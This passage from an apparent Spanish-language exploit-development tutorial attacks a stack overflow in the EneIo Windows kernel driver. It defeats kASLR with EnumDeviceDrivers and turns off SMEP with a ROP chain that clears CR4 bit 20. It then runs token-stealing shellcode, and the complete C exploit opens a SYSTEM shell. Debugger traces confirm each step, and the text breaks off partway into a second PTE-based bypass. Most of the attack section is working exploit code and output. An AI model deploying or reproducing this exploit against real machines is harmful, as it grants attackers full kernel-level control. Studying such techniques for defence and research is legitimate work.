*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
An attempt was made to execute non-executable memory.  The guilty driver
is on the stack trace (and is typically the current instruction pointer).
When possible, the guilty driver's name is printed on
the BugCheck screen and saved in KiBugCheckDriver.
Arguments:
Arg1: 00000213f7740000, Virtual address for the attempted execute.
Arg2: 00000001a6afb867, PTE contents.
Arg3: fffffe0526456660, (reserved)
Arg4: 0000000080000005, (reserved)</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/stack-overflow/image.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/image.png"></p></div></a>

<p class="plain-text">Si no podemos ejecutar instrucciones en modo user tendremos que hacerlo desde modo kernel, para ello podemos hacer <code class="language-plaintext highlighter-rouge">ROP</code> con el módulo <code class="language-plaintext highlighter-rouge">nt</code> y luego de hacer el bypass ya podremos ejecutar nuestro shellcode sin preocuparnos de <code class="language-plaintext highlighter-rouge">SMEP</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> copy</span><span class="p"> C:\Windows\System32\ntoskrnl.exe .
        1 archivo(s) copiado(s).

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ropper</code> podríamos encontrar algunos gadgets muy interesantes pero aun encontramos un problema, la protección <code class="language-plaintext highlighter-rouge">kASLR</code> hace que la dirección base de los módulos sea aleatoria por lo que necesitamos conseguir la dirección base.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file ntoskrnl.exe -I 0x0 --console
</span><span class="ve">[INFO]</span><span class="p"> Load gadgets for section: .text
</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/psapi/nf-psapi-enumdevicedrivers">EnumDeviceDrivers</a> nos devuelve una lista con las direcciones base de todos los controladores del dispositivo, el primer valor devuelto en el arreglo es la dirección de <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> así que tenemos una forma fácil de bypassear <code class="language-plaintext highlighter-rouge">kASLR</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>
</span><span class="o">#include </span><span class="s">&ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

QWORD GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID </span><span class="p">drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers), </span><span class="o">&</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Kenel Base: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, kernelBase);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Solo para verificarlo compilamos y ejecutamos el programa, al hacerlo nos devuelve una dirección en modo kernel, si miramos desde el debugger es la misma que <code class="language-plaintext highlighter-rouge">nt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[*] Kenel Base: 0xfffff8062b000000

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> lm m nt
Browse full module list
start             end                 module name
fffff806`2b000000 fffff806`2c046000   nt         (pdb symbols)</span>
</code></pre></div></div><br>

</section>

<section class="post" id="cr4">
<br><h3 class="post-title">CR4 Method</h3><br>

<p class="plain-text">Para el primer método vamos a entender que es lo que activa el <code class="language-plaintext highlighter-rouge">SMEP</code>, el bit <code class="language-plaintext highlighter-rouge">20</code> del registro <code class="language-plaintext highlighter-rouge">cr4</code> controla la protección, si el bit es <code class="language-plaintext highlighter-rouge">1</code> está encendido, si es <code class="language-plaintext highlighter-rouge">0</code> apagado, desde el debugger podemos encontrar que en nuestra máquina si está encendido.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/10.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/10.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> .formats cr4
Evaluate expression:
  Hex:     00000000`00350ef8
  Decimal: 3477240
  Decimal (unsigned) : 3477240
  Octal:   0000000000000015207370
  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000
  Chars:   .....5..
  Time:    Mon Feb  9 23:54:00 1970
  Float:   low 4.87265e-039 high 0
  Double:  1.71798e-317</span>
</code></pre></div></div><br>

<p class="plain-text">El valor actual de <code class="language-plaintext highlighter-rouge">cr4</code> es <code class="language-plaintext highlighter-rouge">0x350ef8</code>, pero si apagamos el bit <code class="language-plaintext highlighter-rouge">20</code> se convierte a <code class="language-plaintext highlighter-rouge">0x250ef8</code>, por lo que podemos hacer <code class="language-plaintext highlighter-rouge">rop</code> para darle ese valor y desactivar <code class="language-plaintext highlighter-rouge">SMEP</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> ? cr4 ^ (1 << 0n20)
Evaluate expression: 2428664 = 00000000`00250ef8</span>
</code></pre></div></div><br>

<p class="plain-text">Para cambiar el valor del registro podemos usar los siguientes 2 gadgets dentro de <code class="language-plaintext highlighter-rouge">nt</code>, el primero guarda un valor en <code class="language-plaintext highlighter-rouge">rcx</code> y el segundo mueve el valor de <code class="language-plaintext highlighter-rouge">rcx</code> a <code class="language-plaintext highlighter-rouge">cr4</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">(ntoskrnl.exe/PE/x86_64)></span><span class="p"> search pop rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000002079ac</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span><span class="p"> search mov cr4, rcx; ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: mov cr4, rcx; ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x00000000003a0397</span><span class="p">:</span><span class="am"> mov</span><span class="p"> cr4, rcx</span><span class="az">; </span><span class="am">ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<p class="plain-text">Entonces, luego de rellenar el buffer con <code class="language-plaintext highlighter-rouge">A's</code> sobrescribiremos el retorno con una cadena <code class="language-plaintext highlighter-rouge">rop</code>, guarda en <code class="language-plaintext highlighter-rouge">rcx</code> el valor del registro <code class="language-plaintext highlighter-rouge">cr4</code> con el bit <code class="language-plaintext highlighter-rouge">20</code> apagado, luego sobrescribe el registro <code class="language-plaintext highlighter-rouge">cr4</code> actual y finalmente solo retorna a nuestro shellcode.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">QWORD</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">56</span><span class="p">);

</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">; </span><span class="c1">// pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x250ef8</span><span class="p">;</span><span class="c1">              // SMEP bit off (20)
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x3a0397</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">             // token stealing</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ejecutar el shellcode al retornar continuaremos la cadena rop, guardamos en <code class="language-plaintext highlighter-rouge">rcx</code> el valor del registro <code class="language-plaintext highlighter-rouge">cr4</code> ahora con el bit <code class="language-plaintext highlighter-rouge">20</code> encendido y lo restauramos.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">; </span><span class="c1">// pop rcx; ret;
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="p">;</span><span class="c1">              // SMEP bit on (20)
</span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x3a0397</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
</code></pre></div></div><br>

<p class="plain-text">Antes vimos que hay una dirección de retorno válida <code class="language-plaintext highlighter-rouge">0x38</code> bytes adelante del <code class="language-plaintext highlighter-rouge">rsp</code>, considerando el primer gadget como el retorno solo hemos añadido <code class="language-plaintext highlighter-rouge">0x30</code> bytes así que tenemos 2 opciones, en el shellcode ejecutamos un <code class="language-plaintext highlighter-rouge">add rsp, 0x8</code> o solo en la cadena <code class="language-plaintext highlighter-rouge">rop</code> ejecutamos un gadget que ejecute <code class="language-plaintext highlighter-rouge">ret;</code> para saltar al siguiente qword.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">(ntoskrnl.exe/PE/x86_64)> </span><span class="p">search ret;
</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: ret;

</span><span class="ve">[INFO]</span><span class="p"> File: ntoskrnl.exe
</span><span class="ro">0x000000000020003e</span><span class="p">:</span><span class="am"> ret</span><span class="az">;

</span><span class="ro">(ntoskrnl.exe/PE/x86_64)></span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x20003e</span><span class="p">; </span><span class="c1">// ret;  
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit final se ve de la siguiente manera, a través del Buffer Overflow sobrescribe el stack con una cadena <code class="language-plaintext highlighter-rouge">rop</code> que apaga el bit <code class="language-plaintext highlighter-rouge">20</code> del registro <code class="language-plaintext highlighter-rouge">cr4</code> y desactiva <code class="language-plaintext highlighter-rouge">SMEP</code>, luego ejecuta el shellcode y al terminar solo lo vuelve a activar.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include </span><span class="s">&ltpsapi.h>

</span><span class="o">#define </span><span class="na">IOCTL_STACK_OVERFLOW</span><span class="mi"> 0x80102040
</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="na">QWORD GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID </span><span class="p">drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers), </span><span class="o">&</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">EneIo"</span><span class="p">, GENERIC_READ </span><span class="o">|</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">LPVOID</span><span class="p"> payload</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 120</span><span class="p">, MEM_COMMIT </span><span class="o">| </span><span class="p">MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    </span><span class="na">LPVOID</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> VirtualAlloc(</span><span class="mi">NULL</span><span class="p">,</span><span class="o"> sizeof</span><span class="p">(tokenStealing), MEM_COMMIT</span><span class="o"> |</span><span class="p"> MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload,</span><span class="mi"> 56</span><span class="p">,</span><span class="s"> 'A'</span><span class="p">);
    RtlCopyMemory(shellcode, tokenStealing,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="na">QWORD</span><span class="o"> *</span><span class="p">rop </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="o"> *</span><span class="p">) ((</span><span class="na">QWORD</span><span class="p">) payload </span><span class="o">+ </span><span class="mi">56</span><span class="p">);

    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">; </span><span class="c1">// pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x250ef8</span><span class="p">;</span><span class="c1">              // SMEP bit off (20)
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x3a0397</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) shellcode;</span><span class="c1">             // token stealing
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x2079ac</span><span class="p">; </span><span class="c1">// pop rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) </span><span class="mi">0x350ef8</span><span class="p">;</span><span class="c1">              // SMEP bit on (20)
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x3a0397</span><span class="p">; </span><span class="c1">// mov cr4, rcx; ret;
    </span><span class="o">*</span><span class="p">rop</span><span class="o">++ =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) kernelBase</span><span class="o"> +</span><span class="mi"> 0x20003e</span><span class="p">; </span><span class="c1">// ret;
</span><span class="p">
    DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, payload,</span><span class="mi"> 120</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces, ejecutamos el exploit y llegamos al breakpoint, ahora al llegar al <code class="language-plaintext highlighter-rouge">ret</code> vulnerable revisamos el stack y podemos ver que retornará a la cadena <code class="language-plaintext highlighter-rouge">rop</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ene+0x14b8:
fffff806`2fc314b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L8
ffffa089`1e8997e8  fffff806`2b2079ac nt!KiSetAddressPolicy+0x1c
ffffa089`1e8997f0  00000000`00250ef8
ffffa089`1e8997f8  fffff806`2b3a0397 nt!KeFlushCurrentTbImmediately+0x17
ffffa089`1e899800  000001ff`39e00000
ffffa089`1e899808  fffff806`2b2079ac nt!KiSetAddressPolicy+0x1c
ffffa089`1e899810  00000000`00350ef8
ffffa089`1e899818  fffff806`2b3a0397 nt!KeFlushCurrentTbImmediately+0x17
ffffa089`1e899820  fffff806`2b20003e nt!VrpOriginalKeyNameParameterCleanup+0x2e</span>
</code></pre></div></div><br>

<p class="plain-text">Empezamos a ejecutar la cadena, primero guarda en <code class="language-plaintext highlighter-rouge">rcx</code> con un <code class="language-plaintext highlighter-rouge">pop</code> el valor del nuevo <code class="language-plaintext highlighter-rouge">cr4</code> y lo mueve usando un <code class="language-plaintext highlighter-rouge">mov</code>, al hacerlo el <code class="language-plaintext highlighter-rouge">SMEP</code> estará desactivado.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1c:
fffff806`2b2079ac 59              pop     rcx

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1d:
fffff806`2b2079ad c3              ret

</span><span class="ro">0: kd></span><span class="p"> r rcx
rcx=0000000000250ef8

</span><span class="ro">0: kd></span><span class="p"> p
nt!KeFlushCurrentTbImmediately+0x17:
fffff806`2b3a0397 0f22e1          mov     cr4,rcx

</span><span class="ro">0: kd></span><span class="p"> p
000001ff`39e00000 65488b142588010000 mov   rdx,qword ptr gs:[188h]

</span><span class="ro">0: kd></span><span class="p"> r cr4
cr4=0000000000250ef8</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora estamos en el inicio del shellcode, si saltamos hasta el <code class="language-plaintext highlighter-rouge">ret</code> podemos ver que se ejecuta sin activar <code class="language-plaintext highlighter-rouge">SMEP</code>, al terminar en el stack continúa nuestra cadena <code class="language-plaintext highlighter-rouge">rop</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> u rip L0xc
000001ff`39e00000 65488b142588010000 mov     rdx,qword ptr gs:[188h]
000001ff`39e00009 488b82b8000000     mov     rax,qword ptr [rdx+0B8h]
000001ff`39e00010 50                 push    rax
000001ff`39e00011 5b                 pop     rbx
000001ff`39e00012 488b9b48040000     mov     rbx,qword ptr [rbx+448h]
000001ff`39e00019 4881eb48040000     sub     rbx,448h
000001ff`39e00020 4883bb4004000004   cmp     qword ptr [rbx+440h],4
000001ff`39e00028 75e8               jne     000001ff`39e00012
000001ff`39e0002a 488b8bb8040000     mov     rcx,qword ptr [rbx+4B8h]
000001ff`39e00031 80e1f0             and     cl,0F0h
000001ff`39e00034 488988b8040000     mov     qword ptr [rax+4B8h],rcx
000001ff`39e0003b c3                 ret

</span><span class="ro">0: kd></span><span class="p"> pt
000001ff`39e0003b c3              ret

</span><span class="ro">0: kd></span><span class="p"> dqs rsp L5
ffffa089`1e899808  fffff806`2b2079ac nt!KiSetAddressPolicy+0x1c
ffffa089`1e899810  00000000`00350ef8
ffffa089`1e899818  fffff806`2b3a0397 nt!KeFlushCurrentTbImmediately+0x17
ffffa089`1e899820  fffff806`2b20003e nt!VrpOriginalKeyNameParameterCleanup+0x2e
ffffa089`1e899828  fffff806`2b64c801 nt!IopSynchronousServiceTail+0x361</span>
</code></pre></div></div><br>

<p class="plain-text">Después de ejecutar el shellcode continuamos la cadena <code class="language-plaintext highlighter-rouge">rop</code> que restaura el <code class="language-plaintext highlighter-rouge">cr4</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1c:
fffff806`2b2079ac 59              pop     rcx

</span><span class="ro">0: kd></span><span class="p"> p
nt!KiSetAddressPolicy+0x1d:
fffff806`2b2079ad c3              ret

</span><span class="ro">0: kd></span><span class="p"> r rcx
rcx=0000000000350ef8

</span><span class="ro">0: kd></span><span class="p"> p
nt!KeFlushCurrentTbImmediately+0x17:
fffff806`2b3a0397 0f22e1          mov     cr4,rcx

</span><span class="ro">0: kd></span><span class="p"> p
nt!VrpOriginalKeyNameParameterCleanup+0x2e:
fffff806`2b20003e c3              ret

</span><span class="ro">0: kd></span><span class="p"> r cr4
cr4=0000000000350ef8</span>
</code></pre></div></div><br>

<p class="plain-text">En el <code class="language-plaintext highlighter-rouge">ret</code> final podemos ver que retornará a la instrucción dentro de la función <code class="language-plaintext highlighter-rouge">IopSynchronousServiceTail</code> saliendo correctamente de la llamada al driver, esto lo comprobamos ya que si continuamos la ejecución continúa sin llegar a corromper.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs rsp L1
ffffa089`1e899828  fffff806`2b64c801 nt!IopSynchronousServiceTail+0x361

</span><span class="ro">0: kd></span><span class="p"> g
Debuggee is running...</span>
</code></pre></div></div><br>

<p class="plain-text">Solo nos queda probarlo fuera del debugger, al hacerlo podemos ver que hicimos bypass de la protección <code class="language-plaintext highlighter-rouge">SMEP</code> y conseguimos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
windows\user

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span><span class="am"> whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="pte">
<br><h3 class="post-title">PTE Method</h3><br>

<p class="plain-text">Para nuestro segundo método es necesario entender algunas cosas, las direcciones virtuales pasan por un proceso de traducción para obtener la dirección física real a través de tablas, estas establecen cosas como <code class="language-plaintext highlighter-rouge">bits</code> de permisos y protecciones.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/11.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/11.png"></p></div></a>

<p class="plain-text">Resulta que de acuerdo a investigaciones la protección <code class="language-plaintext highlighter-rouge">SMEP</code> solo trabaja cuando la página es marcada como memoria en espacio de usuario, pero si el bit <code class="language-plaintext highlighter-rouge">2</code> que representa <code class="language-plaintext highlighter-rouge">U/S</code> de la <code class="language-plaintext highlighter-rouge">PTE</code> está deshabilitado tratará la página como espacio en memoria de tipo kernel por lo que ni siquiera debería molestarse en verificarlo.</p>
<a href="/exploit-development/windows-kernel/stack-overflow/12.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/stack-overflow/12.png"></p></div></a>

<p class="plain-text">Volvamos al exploit inicial donde en el <code class="language-plaintext highlighter-rouge">ret</code> ejecutará el shellcode, si buscamos la <code class="language-plaintext highlighter-rouge">PTE</code> de la dirección de nuestro shellcode se encuentra en <code class="language-plaintext highlighter-rouge">0xffffca0129b10f00</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
Breakpoint 0 hit
ene+0x14b8:
fffff801`47ac14b8 c3              ret

</span><span class="ro">0: kd></span><span class="p"> !pte poi(rsp)
                                           VA 00000253621e0000
PXE at FFFFCA6532994020    PPE at FFFFCA6532804A68    PDE at FFFFCA650094D880    PTE at FFFFCA0129B10F00
contains 0A000001BB56F867  contains 0A000001BF970867  contains 0A000001BC371867  contains 00000001BF6CD867
pfn 1bb56f    ---DA--UWEV  pfn 1bf970    ---DA--UWEV  pfn 1bc371    ---DA--UWEV  pfn 1bf6cd    ---DA--UWEV</span>
</code></pre></div></div><br>

